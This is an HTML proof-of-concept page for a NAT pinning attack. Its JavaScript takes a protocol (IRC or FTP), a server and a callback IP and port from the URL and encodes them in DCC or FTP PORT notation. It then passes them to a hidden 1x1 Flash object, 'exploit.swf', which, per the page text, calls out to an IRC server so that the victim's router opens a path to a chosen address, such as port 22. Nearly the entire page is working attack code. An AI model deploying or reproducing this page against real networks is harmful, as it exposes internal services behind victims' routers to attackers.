<html>
	<head>
		<title>Natpin IRC POC</title>
	</head>
	<body>
		<script>
			function getParameter(paramName) {
  				var searchString = window.location.search.substring(1),i, val, params = searchString.split("&");
				for (i=0;i<params.length;i++) {
    					val = params[i].split("=");
			    			if (val[0] == paramName) {
      							return unescape(val[1]);
		    				}
  					}
				return null;
			}
			function dot2num(dot) {
				var d = dot.split('.');
				return ((((((+d[0])*256)+(+d[1]))*256)+(+d[2]))*256)+(+d[3]);
			}
			function ftpCalcPortNotation(port){
				x = port%256
				y = (port -x)/256
				return y+","+x
			}

		</script>
		This is a POC demoing a nat pin attack.
		<br>This page contains a Flash movie that callsback to an IRC server.
		<br>and then sends back a DCC chat message specifying to connect back on ip 127.0.0.1, port 22
		<object id="flexploit" type="application/x-shockwave-flash" width="1" height="1">
			<param name="movie" value="exploit.swf"/>
			<param id="FlashVars" name="FlashVars" value=""/>
			<param id="play" name="play" value="false"/>
			<param name="quality" value="high"/>
		</object>
		<br>

		<script>
			var proto = getParameter("type").toUpperCase()
			var server = getParameter("server")
			var callbackip = null
			var callbackport = null
			if (proto=="IRC"){
				callbackip = dot2num(getParameter("ci"))
				callbackport = getParameter("cp")
			}
			if (proto=="FTP"){
				callbackip = getParameter("ci").replace(/\./g,",")
				callbackport = ftpCalcPortNotation(getParameter("cp"))
			}
			//update the flash object
			var obj = document.getElementById("flexploit")
			var parmVars = document.getElementById("FlashVars")
			parmVars.setAttribute("value","type="+proto+"&server="+server+"&cp="+callbackport+"&ci="+callbackip)
			obj.setAttribute ("data","exploit.swf")
			document.getElementById("play").setAttribute("value","true")
		</script>
	</body>
</html>
